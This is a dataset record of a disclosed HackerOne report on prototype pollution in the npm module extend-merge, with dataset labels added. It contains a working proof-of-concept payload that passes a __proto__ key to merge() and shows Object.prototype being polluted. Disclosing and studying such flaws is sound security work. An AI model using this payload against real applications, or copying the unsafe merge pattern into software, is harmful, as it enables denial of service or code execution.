{
    "reported_to": "Node.js third-party modules",
    "reported_by": "d3lla ",
    "title": "[extend-merge] Prototype pollution",
    "content": "\nI would like to report a prototype pollution vulnerability in extend-merge module.\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: extend-merge\nversion: 1.0.5\nnpm page: https://www.npmjs.com/package/extend-merge\nModule Description\nShallow extend and deep merge utility function.\nModule Stats\n[48] weekly downloads\nVulnerability\nVulnerability Description\nThe merge function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\ninstall extend-merge module:\nnpm i extend-merge\nnpm i extend-merge\nCreate an object with __proto__ property and pass it to the merge function:\nCode 239 Bytes\n1\n2const extend_merge = require('extend-merge');\n3const payload =  JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n4let obj = {};\n5console.log(\"Before : \" + obj.polluted);\n6extend_merge.merge({}, payload);\n7console.log(\"After : \" + obj.polluted);\nOutput:\nCode 31 Bytes\n1\n2Before : undefined\n3After : yes\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Modification of Assumed-Immutable Data (MAID)"
    ],
    "screenshots": {},
    "disclosed_date": 1599411600,
    "report_url": "https://hackerone.com/reports/878339",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install the extend-merge module: npm i extend-merge"
        ],
        [
            2,
            "Create an object with __proto__ property and pass it to the merge function: const extend_merge = require('extend-merge'); const payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'); let obj = {}; console.log(\"Before : \" + obj.polluted); extend_merge.merge({}, payload); console.log(\"After : \" + obj.polluted);"
        ]
    ],
    "vuln_description": "The merge function in the extend-merge module can be manipulated to add or modify properties of the Object prototype, leading to prototype pollution. This means any properties injected will be present on all objects, potentially leading to security issues like Denial of Service (DoS), Remote Code Execution, or Property Injection.",
    "reason": "The vulnerability involves a straightforward manipulation of the __proto__ property in a JSON object passed to the merge function. The attack does not require multiple components, complex state manipulation, or novel logic. It is a well-known type of vulnerability (prototype pollution) with a clear and simple exploitation path.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}